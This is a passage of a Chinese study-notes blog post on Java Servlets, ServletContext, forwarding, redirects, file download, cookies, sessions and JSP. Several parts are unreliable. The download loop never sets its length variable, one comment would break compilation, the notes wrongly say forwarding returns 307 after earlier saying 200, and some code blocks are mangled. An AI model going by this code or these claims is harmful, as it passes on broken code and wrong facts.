class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">doGet</span><span class=\"params\">(HttpServletRequest req, HttpServletResponse resp)</span> <span class=\"keyword\">throws</span> ServletException, IOException </span>&#123;</span><br><span class=\"line\">        PrintWriter writer=resp.getWriter();<span class=\"comment\">//响应流</span></span><br><span class=\"line\">        writer.println(<span class=\"string\">&quot;hello,Servlet&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">doPost</span><span class=\"params\">(HttpServletRequest req, HttpServletResponse resp)</span> <span class=\"keyword\">throws</span> ServletException, IOException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>目录结构</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220113162720716.png\" alt=\"image-20220113162720716\"></p>\n<h5 id=\"编写Servlet映射\"><a href=\"#编写Servlet映射\" class=\"headerlink\" title=\"编写Servlet映射\"></a>编写Servlet映射</h5><p>写的是java程序,但是要通过浏览器访问,而浏览器需要连接web服务器,所以我们需要在web服务中注册我们写的servlet,还需要给它一个浏览器能够访问的路径</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220113162502747.png\" alt=\"image-20220113162502747\"></p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220113162617543.png\" alt=\"image-20220113162617543\"></p>\n<p>请求/hello后,会在web.xml中找/hello对应的servlet-name  hello,然后再向上找hello对应的servlet-class</p>\n<h5 id=\"servlet原理\"><a href=\"#servlet原理\" class=\"headerlink\" title=\"servlet原理\"></a>servlet原理</h5><p>本质上就是requset调用servlet中的service抽象类中我们自己实现的方法,再返回给servlet</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220113163642745.png\" alt=\"image-20220113163642745\"></p>\n<h5 id=\"Mapping问题\"><a href=\"#Mapping问题\" class=\"headerlink\" title=\"Mapping问题\"></a>Mapping问题</h5><ul>\n<li><p>一个servlet可以指定一个或者多个路径,(本质上都是请求同一个class)</p>\n</li>\n<li><p>一个servlet可以指定通用(默认)映射路径</p>\n<ul>\n<li>```xml<servlet-mapping>\n    <servlet-name>hello</servlet-name>\n    <url-pattern>/hello/*</url-pattern>  <!--请求hello/下的都会请求到hello-->\n</servlet-mapping>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">- 默认请求路径(等于替代掉了index吧....)</span><br><span class=\"line\"></span><br><span class=\"line\">  - ```xml</span><br><span class=\"line\">    &lt;servlet-mapping&gt;</span><br><span class=\"line\">    \t&lt;servlet-name&gt;hello&lt;/servlet-name&gt;</span><br><span class=\"line\">        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;  &lt;!--默认请求到hello--&gt;</span><br><span class=\"line\">    &lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li><p>可以自定义后缀实现请求映射(类似于正则)</p>\n<ul>\n<li>```xml<servlet-mapping>\n    <servlet-name>hello</servlet-name>\n    <url-pattern>*.abcd</url-pattern>  <!--只要请求后缀有abcd都会映射到hello-->\n</servlet-mapping>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">#### ServletContext</span><br><span class=\"line\"></span><br><span class=\"line\">web容器在启动的时候,它会为每个web程序都创建一个对应的ServletContext对象,它代表了当前的web应用</span><br><span class=\"line\"></span><br><span class=\"line\">##### 共享数据</span><br><span class=\"line\"></span><br><span class=\"line\">很像android中页面传参的intent.putExtra和intent.getExtra</span><br><span class=\"line\"></span><br><span class=\"line\">- 在一个servlet中保存的数据,可以在另外一个servlet中拿到</span><br><span class=\"line\"></span><br><span class=\"line\">有一说一,java万物皆对象的思想确实牛逼,继承了直接就可以用父类方法,不同子类还能互动</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20220113173732922](https://gitee.com/blue_satchel/images/raw/master/image-20220113173732922.png)</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20220113173739121](https://gitee.com/blue_satchel/images/raw/master/image-20220113173739121.png)</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20220113173749274](https://gitee.com/blue_satchel/images/raw/master/image-20220113173749274.png)</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20220113173756430](https://gitee.com/blue_satchel/images/raw/master/image-20220113173756430.png)</span><br><span class=\"line\"></span><br><span class=\"line\">注意点:因为setAttribute写在了helloServlet中的doGet里面,所以要先请求一下/hello,再去请求/getname</span><br><span class=\"line\"></span><br><span class=\"line\">记得类型转换为String</span><br><span class=\"line\"></span><br><span class=\"line\">##### 获取初始化参数</span><br><span class=\"line\"></span><br><span class=\"line\">web.xml中</span><br><span class=\"line\"></span><br><span class=\"line\">```xml</span><br><span class=\"line\">&lt;context-param&gt;</span><br><span class=\"line\">    &lt;param-name&gt;url&lt;/param-name&gt;</span><br><span class=\"line\">    &lt;param-value&gt;jdbc:mysql//localhost:3306/mybatis&lt;/param-value&gt;</span><br><span class=\"line\">&lt;/context-param&gt;</span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n</ul>\n<p>java类里面</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">doGet</span><span class=\"params\">(HttpServletRequest req, HttpServletResponse resp)</span> <span class=\"keyword\">throws</span> ServletException, IOException </span>&#123;</span><br><span class=\"line\">    resp.setContentType(<span class=\"string\">&quot;text/html&quot;</span>);</span><br><span class=\"line\">    resp.setCharacterEncoding(<span class=\"string\">&quot;utf-8&quot;</span>);</span><br><span class=\"line\">    ServletContext context=<span class=\"keyword\">this</span>.getServletContext();</span><br><span class=\"line\">    String url = context.getInitParameter(<span class=\"string\">&quot;url&quot;</span>);</span><br><span class=\"line\">    resp.getWriter().print(url)        </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>请求对应页面会打印出jdbc:mysql//localhost:3306/mybatis</p>\n<h5 id=\"请求转发\"><a href=\"#请求转发\" class=\"headerlink\" title=\"请求转发\"></a>请求转发</h5><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">dispatcher</span> <span class=\"keyword\">extends</span> <span class=\"title\">HttpServlet</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">doGet</span><span class=\"params\">(HttpServletRequest req, HttpServletResponse resp)</span> <span class=\"keyword\">throws</span> ServletException, IOException </span>&#123;</span><br><span class=\"line\">        ServletContext context= <span class=\"keyword\">this</span>.getServletContext();</span><br><span class=\"line\">        context.getRequestDispatcher(<span class=\"string\">&quot;/hello&quot;</span>).forward(req,resp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>请求sd就等于请求了/hello,并且浏览器状态码为200,不是3**的重定向</p>\n<p>我觉得对于安全性来说很好,A请求B,B可以去请求C的内容,虽然A得到了C的内容,但是A永远只和B交流</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220113222128264.png\" alt=\"image-20220113222128264\"></p>\n<h5 id=\"读取资源-配置-文件\"><a href=\"#读取资源-配置-文件\" class=\"headerlink\" title=\"读取资源(配置)文件\"></a>读取资源(配置)文件</h5><p>Properties</p>\n<ul>\n<li>在java目录下新建properties</li>\n<li>在resources目录下新建properties</li>\n</ul>\n<p>发现:都被打包到了同一个路径下:classes,俗称这个路径为classpath</p>\n<p>需要一个文件流</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"HttpServletResponse\"><a href=\"#HttpServletResponse\" class=\"headerlink\" title=\"HttpServletResponse\"></a>HttpServletResponse</h3><p>web服务器接收到客户端的http请求,针对这个请求,分别创建一个代表请求的HttpServletRequest对象,代表响应的一个HttpServletResponse对象</p>\n<p>获取客户端请求过来的参数,找HttpServletRequest</p>\n<p>如果要给客户端响应信息,找HttpServletResponse</p>\n<h4 id=\"响应状态码\"><a href=\"#响应状态码\" class=\"headerlink\" title=\"响应状态码\"></a>响应状态码</h4><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> SC_CONTINUE = <span class=\"number\">100</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_SWITCHING_PROTOCOLS = <span class=\"number\">101</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_OK = <span class=\"number\">200</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_CREATED = <span class=\"number\">201</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_ACCEPTED = <span class=\"number\">202</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_NON_AUTHORITATIVE_INFORMATION = <span class=\"number\">203</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_NO_CONTENT = <span class=\"number\">204</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_RESET_CONTENT = <span class=\"number\">205</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_PARTIAL_CONTENT = <span class=\"number\">206</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_MULTIPLE_CHOICES = <span class=\"number\">300</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_MOVED_PERMANENTLY = <span class=\"number\">301</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_MOVED_TEMPORARILY = <span class=\"number\">302</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_FOUND = <span class=\"number\">302</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_SEE_OTHER = <span class=\"number\">303</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_NOT_MODIFIED = <span class=\"number\">304</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_USE_PROXY = <span class=\"number\">305</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_TEMPORARY_REDIRECT = <span class=\"number\">307</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_BAD_REQUEST = <span class=\"number\">400</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_UNAUTHORIZED = <span class=\"number\">401</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_PAYMENT_REQUIRED = <span class=\"number\">402</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_FORBIDDEN = <span class=\"number\">403</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_NOT_FOUND = <span class=\"number\">404</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_METHOD_NOT_ALLOWED = <span class=\"number\">405</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_NOT_ACCEPTABLE = <span class=\"number\">406</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_PROXY_AUTHENTICATION_REQUIRED = <span class=\"number\">407</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_REQUEST_TIMEOUT = <span class=\"number\">408</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_CONFLICT = <span class=\"number\">409</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_GONE = <span class=\"number\">410</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_LENGTH_REQUIRED = <span class=\"number\">411</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_PRECONDITION_FAILED = <span class=\"number\">412</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_REQUEST_ENTITY_TOO_LARGE = <span class=\"number\">413</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_REQUEST_URI_TOO_LONG = <span class=\"number\">414</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_UNSUPPORTED_MEDIA_TYPE = <span class=\"number\">415</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_REQUESTED_RANGE_NOT_SATISFIABLE = <span class=\"number\">416</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_EXPECTATION_FAILED = <span class=\"number\">417</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_INTERNAL_SERVER_ERROR = <span class=\"number\">500</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_NOT_IMPLEMENTED = <span class=\"number\">501</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_BAD_GATEWAY = <span class=\"number\">502</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_SERVICE_UNAVAILABLE = <span class=\"number\">503</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_GATEWAY_TIMEOUT = <span class=\"number\">504</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_HTTP_VERSION_NOT_SUPPORTED = <span class=\"number\">505</span>;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"常见应用\"><a href=\"#常见应用\" class=\"headerlink\" title=\"常见应用\"></a>常见应用</h4><h5 id=\"1-向浏览器输出消息\"><a href=\"#1-向浏览器输出消息\" class=\"headerlink\" title=\"1.向浏览器输出消息\"></a>1.向浏览器输出消息</h5><p>getWriter(),getOutputStream()</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220113224928187.png\" alt=\"image-20220113224928187\"></p>\n<h5 id=\"2-下载文件\"><a href=\"#2-下载文件\" class=\"headerlink\" title=\"2.下载文件\"></a>2.下载文件</h5><ol>\n<li>要获取下载文件路径</li>\n<li>下载文件名是啥</li>\n<li>设置想办法让浏览器能够支持下载我们需要的东西</li>\n<li>获取下载文件的输入流</li>\n<li>创建缓冲区</li>\n<li>获取OutputStream对象</li>\n<li>将FileOutputStream流写入到buffer缓冲区</li>\n<li>使用OutputStream将缓冲区中的数据输出到客户端</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.blue.servlet;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.ServletException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.ServletOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServlet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">down</span> <span class=\"keyword\">extends</span> <span class=\"title\">HttpServlet</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">doGet</span><span class=\"params\">(HttpServletRequest req, HttpServletResponse resp)</span> <span class=\"keyword\">throws</span> ServletException, IOException </span>&#123;</span><br><span class=\"line\">        String realPath=<span class=\"string\">&quot;F:\\\\Project\\\\maven\\\\maven_web_1\\\\src\\\\main\\\\resources\\\\img.png&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">//2.获取下载文件名</span></span><br><span class=\"line\">        String filename=realPath.substring(realPath.lastIndexOf(<span class=\"string\">&quot;\\\\&quot;</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"comment\">//3.设置头</span></span><br><span class=\"line\">        /中文文件名的话还要设置编码</span><br><span class=\"line\">        resp.setHeader(<span class=\"string\">&quot;Content-Disposition&quot;</span>,<span class=\"string\">&quot;attachment;filename=&quot;</span>+filename);</span><br><span class=\"line\">        <span class=\"comment\">//4.获取下载文件的输入流</span></span><br><span class=\"line\">        FileInputStream in=<span class=\"keyword\">new</span> FileInputStream(realPath);</span><br><span class=\"line\">        <span class=\"comment\">//5.创建缓冲区</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> len=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] buffer=<span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[<span class=\"number\">1024</span>];</span><br><span class=\"line\">        <span class=\"comment\">//6.获取OutputStream对象</span></span><br><span class=\"line\">        ServletOutputStream out=resp.getOutputStream();</span><br><span class=\"line\">        <span class=\"comment\">//7.将fileOutputStream流写入到buffer缓冲区,使用OutputStream将缓冲区中的数据输出到客户端</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (in.read(buffer)&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            out.write(buffer,<span class=\"number\">0</span>,len);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        in.close();</span><br><span class=\"line\">        out.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"实现网页重定向\"><a href=\"#实现网页重定向\" class=\"headerlink\" title=\"实现网页重定向\"></a>实现网页重定向</h4><p>不同于servlet的资源请求重定向,response是通过浏览器实现的重定向</p>\n<p><code>resp.sendRedirect(&quot;路径&quot;);</code></p>\n<p><code>&amp;&#123;pageContext.request.contextPath&#125;</code>代表当前项目路径</p>\n<p>重定向和转发的区别:</p>\n<p>编码:转发307,重定向302</p>\n<p>相同点:页面都会跳转</p>\n<p>不同点:url变与不变</p>\n<h3 id=\"HttpServletRequest\"><a href=\"#HttpServletRequest\" class=\"headerlink\" title=\"HttpServletRequest\"></a>HttpServletRequest</h3><p>通过HttpServletRequest获取客户端的信息</p>\n<p>获取前端提交的参数</p>\n<p><code>req.getParameter(&quot;username&quot;);</code></p>\n<p><code>getParamaterValues();</code>返回一个字符数组</p>\n<h4 id=\"Cookie\"><a href=\"#Cookie\" class=\"headerlink\" title=\"Cookie\"></a>Cookie</h4><ul>\n<li>一个Cookie只能保存一个信息</li>\n<li>一个web站点可以给浏览器发送多个cookie,最多存放20个cookie</li>\n<li>cookie大小有限制4kb</li>\n<li>300个cookie浏览器上限</li>\n</ul>\n<p>删除Cookie</p>\n<ul>\n<li>不设置有效期,关闭浏览器,自动失效</li>\n<li>设置有效期为0</li>\n</ul>\n<p>传递中文记得使用URLEncoder.encode(“中文”,”utf-8”);</p>\n<h4 id=\"Session\"><a href=\"#Session\" class=\"headerlink\" title=\"Session\"></a>Session</h4><ul>\n<li>服务器会给每一个用户(浏览器)创建一个Session对象</li>\n<li>一个Session独占一个浏览器,只要浏览器没有关闭,这个Session就存在</li>\n<li>用户登录之后,整个网站它都可以访问</li>\n</ul>\n<h3 id=\"JSP\"><a href=\"#JSP\" class=\"headerlink\" title=\"JSP\"></a>JSP</h3><p>JAVA Server Pages</p>\n<p>最大特点:</p>\n<ul>\n<li>写JSP就像在写HTML</li>\n<li>区别:<ul>\n<li>HTML静态数据</li>\n<li>JSP页面可以嵌入JAVA代码,为用户提供动态数据</li>\n</ul>\n</li>\n</ul>\n<p>JSP本质上就是Servlet</p>\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220114211237653.png\" alt=\"image-20220114211237653\"  />\n\n<h5 id=\"jsp与对应jsp-java转换关系\"><a href=\"#jsp与对应jsp-java转换关系\" class=\"headerlink\" title=\"jsp与对应jsp.java转换关系\"></a>jsp与对应jsp.java转换关系</h5><p>只要是java代码就原封不动的输出</p>\n<p>如果是HTML代码,就会被转换为:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">out.write(&quot;&lt;xxxxxxx&gt;&quot;)</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"JSP基础语法\"><a href=\"#JSP基础语法\" class=\"headerlink\" title=\"JSP基础语法\"></a>JSP基础语法</h4><p>开始前要先导入依赖,<a href=\"https://mvnrepository.com/\">maven依赖在线查询</a></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--Servlet依赖--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>javax.servlet<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>javax.servlet-api<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.1.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- https://mvnrepository.com/artifact/javax.servlet.jsp/javax.servlet.jsp-api --&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--JSP依赖--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>javax.servlet.jsp<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>javax.servlet.jsp-api<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.3.3<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>provided<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--JSTL表达式的依赖--&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.glassfish.web<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>jakarta.servlet.jsp.jstl<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.0.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--standard标签库--&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- https://mvnrepository.com/artifact/taglibs/standard --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>taglibs<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>standard<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.1.2<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h4><h5 id=\"表达式\"><a href=\"#表达式\" class=\"headerlink\" title=\"表达式\"></a>表达式</h5><figure class=\"highlight 